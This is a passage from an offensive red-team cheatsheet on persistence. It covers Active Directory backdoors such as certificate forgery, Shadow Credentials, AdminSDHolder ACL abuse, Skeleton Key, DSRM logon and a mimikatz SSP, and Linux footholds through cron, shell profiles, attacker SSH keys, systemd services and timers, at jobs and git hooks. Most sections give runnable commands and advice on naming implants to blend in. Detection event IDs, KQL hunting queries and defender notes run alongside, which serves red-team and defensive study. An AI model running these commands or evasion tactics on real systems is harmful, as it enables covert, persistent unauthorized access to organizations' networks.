SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✓ Cred Rotation ✓
              (krbtgt rotation does NOT invalidate)
CLEANUP COST: VERY HIGH (revoke CA cert + remove from NTAuth + reissue
              entire PKI)
═══════════════════════════════════════════════════════════
# Steal CA private key → forge certificates for any user indefinitely
# Survives: krbtgt rotation, password resets

# Remediation requires:
# 1. Revoke CA certificate
# 2. Remove from AD's NTAuth store
# 3. Reissue ENTIRE PKI
# Simply rotating krbtgt or passwords does NOT help. Certificate auth
# depends on issuing CA being trusted in NTAuth — if CA cert removed
# from NTAuth or CA's CRL updated to revoke forged certs, auth fails.

certipy forge -ca-pfx ca.pfx -upn administrator@target.local

# CROSS-REF: ESC1-ESC16 family (Active Directory cheatsheet §08) for
# additional cert-template abuse patterns enabling persistence beyond
# Golden Cert (e.g., ESC1 with EnrolleeSuppliesSubject + Domain Computers
# enrollment rights = persistent enroll-as-anyone capability without
# CA private key theft).
```

### 5.4 — Shadow Credentials (T1556.007)

```
═══════════════════════════════════════════════════════════
SHADOW CREDENTIALS — msDS-KeyCredentialLink ABUSE
MITRE ATT&CK: T1556.007 (Modify Authentication Process: Hybrid Identity)
STEALTH: MEDIUM (mature environments hunt via MDI)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✓ Cred Rotation ✓
              (PKINIT keys survive password rotation)
CLEANUP COST: MEDIUM (clear msDS-KeyCredentialLink + rotate NT hash)
═══════════════════════════════════════════════════════════
# Modern substitute for DCSync when you have write rights on a target
# object but not replication rights on the domain.

# MECHANISM:
# msDS-KeyCredentialLink is the attribute Windows uses for Windows Hello
# for Business key trust. Writing a KeyCredential (public key + metadata)
# to a user/computer object lets you authenticate as that principal via
# PKINIT — you hold matching private key locally. Produces Kerberos TGT
# with NTLM hash in PAC, giving Kerberos access AND downstream PTH.

# PREREQUISITES:
# - GenericWrite / GenericAll / WriteProperty on msDS-KeyCredentialLink
#   for target object
#   (Common paths: owned computer objects, users with loose ACLs,
#    delegated OUs. BloodHound edge: "AddKeyCredentialLink")
# - Domain Functional Level 2016+
# - Writable DC reachable via LDAP/LDAPS

# EXECUTION:
# Certipy (recommended — handles entire chain):
certipy shadow auto -u attacker@target.local -p 'Pass' -account victim
#   → Adds KeyCredential, requests PKINIT TGT, extracts NT hash, restores
#     attribute to prior state (minimal residue)

# Whisker (C# equivalent):
Whisker.exe add /target:victim$ /domain:target.local /dc:DC01
Rubeus.exe asktgt /user:victim$ /certificate:<cert> /getcredentials

# pywhisker (Python port):
pywhisker.py -d target.local -u attacker -p Pass --target victim --action add

# WHAT YOU GET:
# - TGT for target principal (reusable ~10 hours default)
# - NTLM hash extracted from PAC (usable indefinitely for PTH until reset)
# - Works on user AND computer accounts (computer account NT hash enables
#   Silver Ticket forgery + local-SYSTEM-equivalent lateral paths)

# PERSISTENCE VALUE:
# - Survives password reset on target IF you wrote a KeyCredential rather
#   than just stealing the current password
# - Defenders must explicitly audit msDS-KeyCredentialLink to find it
# - Persistent backdoor on krbtgt itself (with equivalent rights) is a
#   variant: KeyCredential on krbtgt enables PKINIT-as-krbtgt tricks

# DETECTION:
# - Directory Service Changes audit (Event ID 5136) — property modification
#   on msDS-KeyCredentialLink
# - MDI alert "Suspected Shadow Credentials attack" triggers on this
# - Event 4662 with Object Properties matching schemaIDGUID for
#   msDS-KeyCredentialLink (5b47d60f-6090-40b2-9f37-2a4de88f3063)
# - PKINIT auth from accounts that never use smart cards is anomalous —
#   surface via KQL:
#     SigninLogs | where AuthenticationDetails has "PKINIT"
#       | where UserPrincipalName !in (known_smartcard_users)
# - PowerShell: Get-ADUser/Computer -Properties msDS-KeyCredentialLink
#   audited periodically; any KeyCredential on a service account or
#   privileged account is a red flag

# ERADICATION:
# - Clear msDS-KeyCredentialLink on all non-WHfB principals
# - Rotate NT hash (password) of any affected account — hash extracted
#   via PKINIT survives KeyCredential removal
# - Review all recent 5136 events on this attribute to build scope

# OPSEC: MEDIUM — mature environments hunt via MDI. Stealth depends on
# target being ineligible for WHfB (so attribute is normally empty) +
# timing (certipy auto cleans up).
```

### 5.5 — AdminSDHolder Backdoor (T1484)

```powershell
# ═══════════════════════════════════════════════════════════
# ADMINSDHOLDER BACKDOOR — SDProp hourly propagation
# MITRE ATT&CK: T1484 (Domain or Tenant Policy Modification)
# STEALTH: MEDIUM (audit catches new ACE; few SOCs hunt this)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✓ (if AD not remediated)
# CLEANUP COST: MEDIUM (review + clean AdminSDHolder ACL + wait full
#               SDProp cycle — 60 min default — to confirm no re-propagate)
# ═══════════════════════════════════════════════════════════
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=target,DC=local" -PrincipalIdentity attacker -Rights All
# SDProp propagates every 60 min to all protected objects
# (members of Account Operators, Server Operators, Print Operators,
#  Backup Operators, Domain/Enterprise/Schema/Cert Publishers Admins,
#  Replicator, krbtgt, Administrator, etc.)
```

### 5.6 — Skeleton Key (T1556.001)

```
═══════════════════════════════════════════════════════════
SKELETON KEY — LSASS PATCH ON DC
MITRE ATT&CK: T1556.001 (Modify Authentication Process: DC)
STEALTH: MEDIUM (does NOT survive DC reboot)
SURVIVABILITY: ✗ Reboot
═══════════════════════════════════════════════════════════
# Patches LSASS on DC → all users accept attacker-specified password
# Does NOT survive DC reboot
misc::skeleton

# CRITICAL MODERN CAVEAT:
# - DCs have LSA protection (RunAsPPL) enabled by default on Server 2019+
# - LSASS runs as Protected Process Light — Mimikatz cannot patch its
#   memory from user mode even as SYSTEM
# - To execute Skeleton Key on modern DC requires EITHER:
#   * Kernel write primitive (BYOVD on DC — extremely high-signal), OR
#   * Path that bypasses PPL without kernel (PPLFault-class primitives,
#     handle inheritance from pre-existing PPL process)
#   These are research-grade and none are OPSEC-quiet
# - Credential Guard does NOT help here — Skeleton Key targets LSASS's
#   in-memory Kerberos state, not isolated LSA secrets
# - Technique remains in reference because many mid-market DCs still run
#   without RunAsPPL enforced; validate before attempting
```

### 5.7 — DSRM Backdoor

```powershell
# ═══════════════════════════════════════════════════════════
# DSRM BACKDOOR — DSRM administrator network logon
# STEALTH: HIGH (rarely audited)
# SURVIVABILITY: Reboot ✓ Passwd ✓ (if DSRM password unchanged)
# ═══════════════════════════════════════════════════════════
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# DSRM admin password set during DC promotion + rarely rotated
# Once registry value is 2, DSRM account can authenticate over network
# as local admin on that DC
```

### 5.8 — SID History Injection (T1134.005)

```powershell
# ═══════════════════════════════════════════════════════════
# SID HISTORY INJECTION
# MITRE ATT&CK: T1134.005 (SID-History Injection)
# ═══════════════════════════════════════════════════════════
sid::add /sam:attacker /new:S-1-5-21-xxx-512
# SID Filtering on trusts mitigates cross-domain variants; intra-domain
# variants work where schema allows sidHistory writes
```

### 5.9 — Custom SSP / LSA Security Package (mimilib)

```
═══════════════════════════════════════════════════════════
CUSTOM SSP — captures plaintext passwords via LSA
MITRE ATT&CK: T1547.005 (Security Support Provider)
STEALTH: MED-HARD (where LSA protection OFF)
═══════════════════════════════════════════════════════════
# Load malicious Security Support Provider → captures all plaintext passwords
misc::memssp
# Persistent: add mimilib.dll to LSA Security Packages registry

# CAVEAT: Same LSA protection caveat as Skeleton Key + LSA Auth Package
# (§3.11). With RunAsPPL enforced, SSP DLL must be signed as PPL-compatible
# or it will not load. On hosts where RunAsPPL is NOT enforced (still
# common on standalone servers and unmanaged hosts), this technique works
# unmodified.
```

### 5.10 — Machine Account Quota

```
═══════════════════════════════════════════════════════════
MACHINE ACCOUNT QUOTA — sacrificial computer accounts
═══════════════════════════════════════════════════════════
# Default quota: 10 machine accounts per user
# Persist independently of user account
impacket-addcomputer target.local/user:pass -computer-name 'PERSIST$' -computer-pass 'Passw0rd!'

# Chain with RBCD (Resource-Based Constrained Delegation) for lateral
# movement; or use created computer account as persistent authentication
# principal.
```

### 5.11 — AD CS Cert Template Manipulation (Beyond Golden Cert)

```
═══════════════════════════════════════════════════════════
AD CS CERT TEMPLATE MANIPULATION — PERSISTENT ENROLLMENT-AS-ANYONE
MITRE ATT&CK: T1484 (Domain Policy Mod), T1649 (Steal/Forge Auth Certs)
STEALTH: HIGH (defenders rarely audit cert templates)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✓ Cred Rotation ✓
              (until template / template ACL audited)
CLEANUP COST: VERY HIGH (audit + remediate every cert template)
═══════════════════════════════════════════════════════════

# Beyond Golden Certificate (CA private key theft): create or modify
# existing AD CS certificate template to persistently enable
# enrollment-as-anyone capability without needing CA private key.

# ESC1-ESC16 family enables this — see 08-active-directory-cheatsheet.md
# for full taxonomy. Persistence-relevant variants:

# ESC1 — Enrollee Supplies Subject + Domain Users enrollment:
# - Modify existing template to set msPKI-Certificate-Name-Flag bit 0x1
#   (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
# - Grant Domain Computers / Domain Users enrollment rights
# - Any low-priv user can now enroll cert for any UPN
# - Persistent until template is audited + remediated

# ESC4 — Vulnerable Cert Template ACL:
# - GenericWrite / WriteOwner on cert template = ability to modify it
#   to ESC1 state at any time
# - Plant the ACL → use later for on-demand cert enrollment

# ESC8 — NTLM relay to AD CS web enrollment:
# - HTTP / HTTPS ICSCEP / certsrv endpoints
# - Combine with NTLM relay for persistent priv enrollment

# Discovery (Certipy):
certipy find -u attacker@target.local -p 'Pass' -dc-ip <DC>
# Reports vulnerable templates by ESC ID

# Modification (with sufficient ACL):
certipy template -username attacker@target.local -password 'Pass' -template <name> -save-old

# DETECTION:
# - Event ID 5136 on cert template modification
# - Event ID 4886 (Certificate Services received certificate request)
# - Anomalous SAN (subjectAlternativeName) in issued certs — cert
#   issued for a UPN that doesn't match the requesting account
# - Microsoft Defender for Identity "Suspected Active Directory attack
#   using AD CS" (Q2 2024+ alert family)

# OPSEC: HIGH — cert template modifications are infrequently audited;
# eradication requires comprehensive template review + template-ACL
# remediation + revocation of all certs issued during compromise window.
```

```
═══════════════════════════════════════════════════════════
SECTION 5 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §14.5 AZUREADSSOACC$ hybrid persistence (DA → AZUREADSSOACC$
          extraction)
Enables → §14.6 ADFS Golden SAML (DA → ADFS server compromise)
Enables → §14 cloud persistence cascading from on-prem AD
Cross-ref → 08-active-directory-cheatsheet.md for ESC1-ESC16 detail
Cross-ref → §6.4 Defender Stack reference (MDI alerts on Domain layer)
NEVER → Use rc4 encryption type for forged tickets in AES-only domain;
        immediate MDI alert
NEVER → Skip Cred Cleanup audit assuming krbtgt rotation alone is enough;
        Golden Cert / Shadow Creds / AZUREADSSOACC$ all survive krbtgt reset
```

---

## 6 — WINDOWS: OPSEC & DETECTION REFERENCE

### 6.1 — Event IDs to Know (Persistence-Specific)

```
═══════════════════════════════════════════════════════════
WINDOWS EVENT IDs — PERSISTENCE-SPECIFIC
═══════════════════════════════════════════════════════════
SECURITY LOG:
  4698  Scheduled task created
  4699  Scheduled task deleted
  4700  Scheduled task enabled
  4702  Scheduled task updated
  4697  Service installed (Security log — requires audit policy)
  7045  New service installed (System log)
  7040  Service start type changed
  5136  Directory Service Changes (msDS-KeyCredentialLink, AdminSDHolder,
        cert template modifications)
  4662  Object access (DACL changes, attribute reads)
  4886  Certificate Services received certificate request
  4887  Certificate Services approved certificate request
  4769  Kerberos service ticket request (Golden / Diamond / Sapphire,
        AZUREADSSOACC$ pattern detection)

SYSMON (assume on mature targets):
  1     Process creation (any tool execution)
  6     Driver loaded (BYOVD detection)
  7     Image loaded (DLL loading — side-loading detection)
  11    File created (Startup folder, dropped binaries)
  12    Registry key created
  13    Registry value set (Run keys, IFEO, COM hijack, Winlogon, all
        registry persistence)
  14    Registry key/value rename
  19    WMI EventFilter created
  20    WMI EventConsumer created
  21    WMI EventConsumerToFilter binding

WMI:
  5861  WMI permanent event registered (WMI-Activity/Operational log)

TASK SCHEDULER:
  106   Task registered (Microsoft-Windows-TaskScheduler/Operational)
  140   Task updated
  141   Task removed
  200   Task executed
  201   Task completed

CODE INTEGRITY:
  3033  LSA protection blocked unsigned package load
  3063  LSA protection signature verification failed
  3089  Signature verification failure
  3099  Vulnerable Driver Blocklist triggered (BYOVD load failure)

DEFENDER FOR IDENTITY (MDI) ALERT NAMES:
  - Suspected Golden Ticket usage
  - Suspected Diamond Ticket / Sapphire Ticket
  - Suspected Shadow Credentials attack
  - Suspected DCSync attack
  - Suspected DCShadow attack
  - Suspected Skeleton Key attack
  - Suspected pass-the-hash attack
  - Suspected pass-the-ticket attack
  - Honeytoken account login attempt
  - Suspected Active Directory attack using AD CS (Q2 2024+ family)
```

### 6.2 — Stealth Ranking (Honest Assessment)

```
═══════════════════════════════════════════════════════════
STEALTH RANKING (safest → most detected) — 2026 BASELINE
═══════════════════════════════════════════════════════════
1. UEFI / firmware (BlackLotus pre-DBX-revocation)  Maximum if achievable
2. eBPF rootkit Linux (no Falco/Tetragon/Tracee deployed)
3. DLL side-loading in signed process              EDR trusts host process
4. COM hijacking via HKCU                          Legitimate registry
5. Time Provider / Port Monitor DLL                Less monitored vs Run/svc
6. SilentProcessExit trigger                       WER infrastructure
7. Active Setup                                    Legitimate Windows feature
8. WMI Event Subscription                          Sysmon 19-21 detects
9. AD Cert Template Manipulation                   Few SOCs audit
10. Diamond / Sapphire Ticket                      Valid PAC signatures
11. AdminSDHolder ACE                              60-min SDProp lag
12. Shadow Credentials (msDS-KeyCredentialLink)    MDI alerts (mature SOCs)
13. AZUREADSSOACC$ ticket forgery                  MDI + sign-in correlation
14. ADFS Golden SAML                               Requires log correlation
15. SCCM / Intune mass deployment                  Audit logs but blast-rad
16. BYOVD + boot-start driver                      Driver load = noisy
17. WSUS / patch poisoning                         Detection lags exploitation
18. BITS Jobs                                      Operational log catches
19. Scheduled Tasks                                Heavy monitoring
20. Services                                       Heavy monitoring
21. Registry Run keys                              Most basic; every EDR

HONEST ASSESSMENT:
  None of these are "invisible" on a mature target. Sysmon Event ID 13
  (registry value set) fires on every registry-based persistence. Autoruns
  and PersistenceSniper inventory all paths. What separates "safer" from
  "more detected" is whether the SOC runs scheduled hunts on the specific
  key — not whether the key is written to event log. Against MDE +
  Sentinel + MDI environment with mature hunting queries, realistic
  stealth differential between top and bottom of this list is hours to
  days, not weeks.
```

### 6.3 — KQL Hunting Queries (Extended)

```kql
// Registry Run keys — user and machine
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any (
    @"\Microsoft\Windows\CurrentVersion\Run",
    @"\Microsoft\Windows\CurrentVersion\RunOnce",
    @"\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
| where RegistryValueData has_any ("AppData", "ProgramData", "Users\\Public", "Temp\\")
| project Timestamp, DeviceName, InitiatingProcessFileName, RegistryKey,
          RegistryValueName, RegistryValueData, InitiatingProcessAccountName
```

```kql
// Scheduled tasks with suspicious command lines
DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has_any ("powershell", "rundll32", "regsvr32",
    "mshta", "wmic", "-ep bypass", "-w hidden", "FromBase64String",
    "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

```kql
// WMI permanent event subscriptions
DeviceEvents
| where ActionType in ("WmiBindEventFilterToConsumer",
                       "WmiCreateEventFilter",
                       "WmiCreateEventConsumer")
| project Timestamp, DeviceName, ActionType, AdditionalFields
```

```kql
// New services from suspicious paths
DeviceEvents
| where ActionType == "ServiceInstalled"
| where FolderPath has_any (@"\Users\", @"\ProgramData\", @"\Temp\",
                            @"\AppData\")
  or InitiatingProcessCommandLine has "powershell"
| project Timestamp, DeviceName, ServiceName = ProcessName, FolderPath,
          InitiatingProcessCommandLine
```

```kql
// LSA Authentication/Security Packages modification
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKey endswith @"\Control\Lsa"
| where RegistryValueName in~ ("Authentication Packages",
                                "Security Packages",
                                "Notification Packages")
| project Timestamp, DeviceName, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName
```

```kql
// COM hijack via HKCU CLSID
DeviceRegistryEvents
| where ActionType == "RegistryValueSet"
| where RegistryKey matches regex @"HKEY_USERS\\S-1-5-21-.*\\Software\\Classes\\CLSID\\{[0-9A-Fa-f\-]+}\\InprocServer32$"
| where RegistryValueData endswith ".dll"
| project Timestamp, DeviceName, RegistryKey, RegistryValueData,
          InitiatingProcessAccountName
```

```kql
// Shadow Credentials — msDS-KeyCredentialLink changes on DC
// Requires Directory Service Changes auditing enabled (Event 5136)
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName =~ "msDS-KeyCredentialLink"
| project TimeGenerated, Computer, SubjectUserName, ObjectDN, OperationType
```

```kql
// AZUREADSSOACC$ Kerberos pattern — anomalous TGS requests
SecurityEvent
| where EventID == 4769
| where ServiceName =~ "AZUREADSSOACC$"
| summarize count(), src_hosts=dcount(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)
| where src_hosts > 2  // baseline anomaly
```

```kql
// Diamond / Sapphire Ticket — Kerberos with anomalous PAC validation
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType !in ("0x12", "0x11")  // not AES256/128 (RC4)
| where ServiceName !endswith "$"  // exclude computer accounts
| summarize count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)
| where count_ > 10
```

```kql
// SCCM / Intune mass deployment anomaly
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("CcmExec.exe", "IntuneManagementExtension.exe")
| where FileName !in (legit_signed_software_list)
| summarize count(), distinct_devices=dcount(DeviceName) by FileName, bin(Timestamp, 1h)
| where distinct_devices > 50  // mass deployment threshold
```

```kql
// AD CS Cert Template Manipulation
SecurityEvent
| where EventID == 5136
| where ObjectDN has "CN=Certificate Templates"
| project TimeGenerated, Computer, SubjectUserName, AttributeLDAPDisplayName, OperationType
```

```kql
// Federated Identity Credential anomaly (Azure)
AzureActivity
| where OperationNameValue has "MICROSOFT.MANAGEDIDENTITY/USERASSIGNEDIDENTITIES/FEDERATEDIDENTITYCREDENTIALS"
| where ActivitySubstatusValue == "Created"
| project TimeGenerated, Caller, ResourceId, Properties
```

### 6.4 — Defender Stack Reference (Windows-Side)

```
═══════════════════════════════════════════════════════════
WHAT EACH DEFENDER PRODUCT SEES (Windows persistence-specific)
═══════════════════════════════════════════════════════════

ENDPOINT (host telemetry):
  Microsoft Defender for Endpoint (MDE) / Defender XDR
    Sees: All Sysmon-equivalent events natively + ETW-TI (kernel-level
          memory ops), AMSI inspection, ASR rule enforcement,
          DeviceRegistryEvents/ProcessEvents/FileEvents/NetworkEvents/
          ImageLoadEvents tables. Cloud-delivered protection adds
          behavioral classification.
    Misses: Identity-plane events (handled by MDI); cross-host correlation
          (XDR layer adds this).
    Specific persistence-detection strengths:
      - Service installation, Scheduled task creation
      - Registry persistence (most paths)
      - Image load anomalies (DLL sideload detection)
      - WMI subscription creation
      - Driver load events (Sysmon 6 equivalent)
      - LSA Auth Package / SSP additions

  CrowdStrike Falcon Insight XDR
    Same primitives via different sensor model; strong behavioral graph
    via Storyline / Threat Graph; Process Tree analysis catches
    parent-child anomalies (services spawning suspicious children).

  SentinelOne Singularity
    Storyline causal-graph reconstruction; per-technique behavioral
    rules; strong on driver-load + image-load anomalies.

  Cybereason / Carbon Black / Elastic Defend
    Similar primitives; vendor-specific behavioral models.

IDENTITY (DC + Entra signals):
  Microsoft Defender for Identity (MDI)
    Sees: ALL DC traffic (Kerberos, LDAP, NTLM, SAMR, DCSync, DCShadow,
          replication); 30+ named attack patterns. Specific persistence-
          relevant alerts:
      - Suspected Golden Ticket usage
      - Suspected Diamond Ticket / Sapphire Ticket (sub-class of Golden)
      - Suspected Shadow Credentials attack (T1556.007)
      - Suspected DCSync attack (replication)
      - Suspected DCShadow attack (rogue replication)
      - Suspected Skeleton Key attack (T1556.001)
      - Suspected Active Directory attack using AD CS (Q2 2024+ family)
      - Honeytoken account login attempt
    Misses: Cloud-side persistence (Graph subscriptions, OAuth apps —
          handled by MDCA / Sign-in logs).

  Entra Sign-in Logs + Identity Protection
    Sees: All authentication attempts, risk scoring, atypical-sign-in
          detection. Persistence-relevant:
      - PKINIT auth from accounts that never used smart cards
      - Authentication from federated domain without corresponding ADFS
        event (Golden SAML indicator)
      - Sign-ins via Kerberos protocol from unexpected locations (AZUREADSSOACC$)

CLOUD (SaaS + cloud-side):
  Defender for Cloud Apps (MDCA)
    Sees: SaaS sessions, OAuth app-grant events, shadow-IT, mass-
          deployment patterns (Q1 2026 SaaS Security Posture
          Management additions).

  Wiz / Lacework / Orca (CSPM)
    Sees: Cloud config drift, exposed assets, persistent IAM over-
          permissioning, attack-path graph reconstruction including
          FIC chain analysis.

NETWORK:
  Vectra AI / Darktrace / ExtraHop Reveal(x) (NDR)
    Sees: East-west scan + lateral movement, C2 beaconing, data exfil
          patterns. Persistence-relevant: continuous beacon from
          persistent foothold; anomalous DNS for newly-established
          C2 channels.

XDR CORRELATION:
  Defender XDR / CrowdStrike XDR / S1 Singularity
  Chains: persistence install → endpoint anomaly → identity event →
  cross-tenant access → automated containment within minutes.
```

```
═══════════════════════════════════════════════════════════
SECTION 6 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Cross-ref → §10.4 Linux Defender Stack reference
Cross-ref → §11.X macOS Defender Stack reference
Cross-ref → §13.X K8s Defender Stack reference
Cross-ref → §14.X Cloud Defender Stack reference
Use → KQL queries above as starting templates; customize for tenant
       baseline before operational use
```

---

## 7 — LINUX: USER-LEVEL PERSISTENCE

> **Typical chains through this section:** User-level via cron / shell profile / SSH key as fast fallback → privesc → upgrade to root-level (§8) → kernel-level (§9). Linux user-level is generally less monitored than Windows user-level, but mature Linux EDR (Falco/Tetragon/Tracee) catches most patterns.

### 7.1 — Cron Jobs — User (T1053.003)

```bash
# ═══════════════════════════════════════════════════════════
# USER CRON — no root required
# MITRE ATT&CK: T1053.003 (Cron)
# STEALTH: LOW    SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: LOW
# ═══════════════════════════════════════════════════════════
(crontab -l 2>/dev/null; echo "*/5 * * * * /home/user/.local/bin/update >/dev/null 2>&1") | crontab -

# DETECTION:
# - /var/spool/cron/crontabs/<user>
# - auditd cron rules
# - osquery crontab table

# OPSEC: Name binary to blend (.local/bin/update, .cache/dbus-session)
```

### 7.2 — Shell Profile Modification (T1546.004)

```bash
# ═══════════════════════════════════════════════════════════
# SHELL PROFILE — fires on user shell open
# MITRE ATT&CK: T1546.004 (Unix Shell Configuration Modification)
# STEALTH: MEDIUM
# ═══════════════════════════════════════════════════════════
echo '/home/user/.config/dbus-session &' >> ~/.bashrc
echo '/home/user/.config/dbus-session &' >> ~/.bash_profile
echo '/home/user/.config/dbus-session &' >> ~/.profile
echo '/home/user/.config/dbus-session &' >> ~/.zshrc

# DETECTION: File integrity monitoring on profile files; auditd rules
# OPSEC: MEDIUM — common technique; profile files change naturally
```

### 7.3 — SSH Authorized Keys (T1098.004)

```bash
# ═══════════════════════════════════════════════════════════
# SSH KEY PERSISTENCE
# MITRE ATT&CK: T1098.004 (SSH Authorized Keys)
# STEALTH: MEDIUM (depends on whether keys are audited)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: LOW
# ═══════════════════════════════════════════════════════════
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA...attacker_key operator@deploy" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# OPSEC: Use ed25519 (shorter key, less conspicuous). Append to end of
# file (less likely noticed than replacement).

# DETECTION:
# - File modification on authorized_keys (FIM)
# - SSH auth logs (/var/log/auth.log) — login from new key
# - osquery authorized_keys table
```

### 7.4 — XDG Autostart (T1547.001 equivalent)

```bash
# ═══════════════════════════════════════════════════════════
# XDG AUTOSTART — desktop Linux only
# STEALTH: MEDIUM    SURVIVABILITY: Reboot ✓ (only on GUI sessions)
# ═══════════════════════════════════════════════════════════
mkdir -p ~/.config/autostart
cat << 'EOF' > ~/.config/autostart/dbus-update.desktop
[Desktop Entry]
Type=Application
Name=D-Bus Session Update
Exec=/home/user/.config/dbus-session
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

# DETECTION: Files in ~/.config/autostart/, process creation at login
# OPSEC: Common on developer/admin workstations with GUI; useful pretext
```

### 7.5 — at Jobs

```bash
# ═══════════════════════════════════════════════════════════
# AT JOBS — one-shot or self-rescheduling
# STEALTH: MEDIUM (less common than cron, stands out in inventory)
# ═══════════════════════════════════════════════════════════
echo "/home/user/.config/dbus-session" | at now + 1 hour

# Self-rescheduling pattern:
cat << 'EOF' > /home/user/.config/at-persist.sh
#!/bin/bash
/home/user/.config/dbus-session &
echo "/home/user/.config/at-persist.sh" | at now + 1 hour 2>/dev/null
EOF
chmod +x /home/user/.config/at-persist.sh
echo "/home/user/.config/at-persist.sh" | at now + 1 minute

# DETECTION: /var/spool/at/ directory; atd logs
```

### 7.6 — Git Hooks (Developer Targeted)

```bash
# ═══════════════════════════════════════════════════════════
# GIT HOOKS — fires on git operations
# STEALTH: HIGH against developer workstations without DevSecOps tooling
# SURVIVABILITY: Reboot ✓ (on next git op); does NOT survive repo clone
#               (hooks not pushed by default)
# ═══════════════════════════════════════════════════════════
echo '#!/bin/bash' > /path/to/repo/.git/hooks/post-checkout
echo '/home/user/.config/dbus-session &' >> /path/to/repo/.git/hooks/post-checkout
chmod +x /path/to/repo/.git/hooks/post-checkout
# Also: post-merge, pre-push, post-receive (server-side)

# DETECTION:
# - File integrity monitoring on .git/hooks/
# - DevSecOps environments may include in CI integrity checks
# - pre-commit allowlisting / signed-commit workflows block in mature shops

# OPSEC: HIGH against developer workstations without DevSecOps; lower
# against environments with pre-commit allowlisting
```

```
═══════════════════════════════════════════════════════════
SECTION 7 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §8 root-level (after privesc)
Enables → §9 kernel-level (after root)
Cross-ref → §10.4 Linux Defender Stack reference
```

---

## 8 — LINUX: ROOT-LEVEL PERSISTENCE

### 8.1 — Systemd Service (T1543.002)

```bash
# ═══════════════════════════════════════════════════════════
# SYSTEMD SERVICE
# MITRE ATT&CK: T1543.002 (Systemd Service)
# STEALTH: MEDIUM (named to blend); systemctl list-unit-files inventories
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# ═══════════════════════════════════════════════════════════
cat << 'EOF' > /etc/systemd/system/dbus-session-mgr.service
[Unit]
Description=D-Bus Session Manager
After=network.target

[Service]
Type=simple
ExecStart=/opt/.cache/session-mgr
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable dbus-session-mgr.service
systemctl start dbus-session-mgr.service

# DETECTION:
# - New service unit files (FIM on /etc/systemd/system/)
# - systemctl list-unit-files diff vs baseline
# - journalctl shows service starts
# - auditd watch on systemd unit dir

# OPSEC: Name to blend (dbus-*, snapd-*, systemd-*, polkit-*, nm-*)
```

### 8.2 — Systemd Timer (T1053.006)

```bash
# ═══════════════════════════════════════════════════════════
# SYSTEMD TIMER — modern replacement for cron, blends with maintenance
# MITRE ATT&CK: T1053.006 (Systemd Timers)
# STEALTH: HIGH (blends with system maintenance)
# ═══════════════════════════════════════════════════════════
cat << 'EOF' > /etc/systemd/system/logrotate-check.timer
[Unit]
Description=Log Rotation Health Check

[Timer]
OnCalendar=*:0/15
Persistent=true
RandomizedDelaySec=60

[Install]
WantedBy=timers.target
EOF

cat << 'EOF' > /etc/systemd/system/logrotate-check.service
[Unit]
Description=Log Rotation Check

[Service]
Type=oneshot
ExecStart=/opt/.cache/session-mgr
StandardOutput=null
EOF
systemctl daemon-reload
systemctl enable logrotate-check.timer
systemctl start logrotate-check.timer

# DETECTION: systemctl list-timers; new timer unit files
# OPSEC: HIGH — timers blend well with system maintenance
```

### 8.3 — Cron — System (T1053.003)

```bash
# ═══════════════════════════════════════════════════════════
# SYSTEM CRON
# MITRE ATT&CK: T1053.003 (Cron)
# ═══════════════════════════════════════════════════════════
# /etc/crontab:
echo "*/10 * * * * root /opt/.cache/session-mgr >/dev/null 2>&1" >> /etc/crontab

# /etc/cron.d/ (crontab format WITH user field):
echo "*/10 * * * * root /opt/.cache/session-mgr >/dev/null 2>&1" > /etc/cron.d/logrotate-check
chmod 644 /etc/cron.d/logrotate-check

# /etc/cron.daily/ (executable script, runs daily by anacron):
cp payload /etc/cron.daily/logrotate2 && chmod +x /etc/cron.daily/logrotate2

# DETECTION: /etc/crontab, /etc/cron.d/*, /etc/cron.daily/*, syslog cron
```

### 8.4 — Init.d / rc.local (Legacy SysV)

```bash
# ═══════════════════════════════════════════════════════════
# rc.local + SysV init scripts — DEPRECATED but still present
# STEALTH: MEDIUM
# ═══════════════════════════════════════════════════════════
echo '/opt/.cache/session-mgr &' >> /etc/rc.local
chmod +x /etc/rc.local
# Systemd compatibility may need: systemctl enable rc-local.service

# SysV init script:
cp payload /etc/init.d/session-mgr && chmod +x /etc/init.d/session-mgr
update-rc.d session-mgr defaults

# DETECTION: File changes in /etc/rc.local, /etc/init.d/
```

### 8.5 — SSH — Root-Level (T1098.004)

```bash
# ═══════════════════════════════════════════════════════════
# ROOT-LEVEL SSH KEY DEPLOYMENT
# ═══════════════════════════════════════════════════════════
# Add key to root AND multiple user accounts
for user_home in /root /home/*; do
  [ -d "$user_home" ] || continue
  mkdir -p "$user_home/.ssh" 2>/dev/null
